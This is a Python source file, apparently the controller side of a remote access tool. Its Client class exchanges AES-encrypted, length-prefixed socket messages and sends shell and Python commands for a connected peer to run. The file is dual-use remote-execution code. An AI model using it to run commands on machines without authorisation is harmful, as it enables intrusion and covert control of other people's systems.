import socket
import logging

from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher


# Padding for AES
pad = padding.PKCS7(256)
header_length = 8


class Client:
    """ Client class """

    def __init__(self, conn: socket.socket, address: tuple, id: str) -> None:
        self.conn = conn
        self.address = address
        self.id = id

    def add_cipher(self, cipher: Cipher) -> None:
        """ Add a cipher """
        self.cipher = cipher

    def _encrypt(self, data: bytes) -> bytes:
        """ Encrypt data """

        # Pad data
        padder = pad.padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt padded data
        encryptor = self.cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        return encrypted_data

    def _decrypt(self, data: bytes) -> bytes:
        """ Decrypt data """

        # Decrypt data
        decryptor = self.cipher.decryptor()
        decrypted_data = decryptor.update(data) + decryptor.finalize()

        # Unpad data
        unpadder = pad.unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()

        return unpadded_data

    def __read(self, amount: int) -> bytes:
        """ Receive raw data from peer """
        data = b''
        while len(data) < amount:
            buffer = self.conn.recv(amount)
            if not buffer:
                # Assume connection was closed
                logging.info('Assuming connection was closed: %s' % str(self.address))
                raise ConnectionResetError
            data += buffer

        return data

    def _read(self) -> bytes:
        """ Read messages from client """
        header = self.__read(header_length)
        message_length = int.from_bytes(header, 'big')
        return self.__read(message_length)

    def _write(self, data: bytes) -> None:
        """ Write message data to peer """
        # Create header for data
        header = len(data).to_bytes(header_length, byteorder='big')
        message = header + data
        self.conn.sendall(message)

    def read(self) -> bytes:
        """ Read encrypted messages from peer """
        return self._decrypt(self._read())

    def write(self, data: bytes) -> bool:
        """ Encrypt a message and send it to a peer """
        return self._write(self._encrypt(data))

    def shell(self, command: str) -> None:
        """ Execute a shell command on client """
        self.write(b'SHELL')
        self.write(command.encode())
        return self.read()

    def python(self, command: str) -> None:
        """ Execute a python command on client """
        self.write(b'PYTHON')
        self.write(command.encode())
        return self.read()
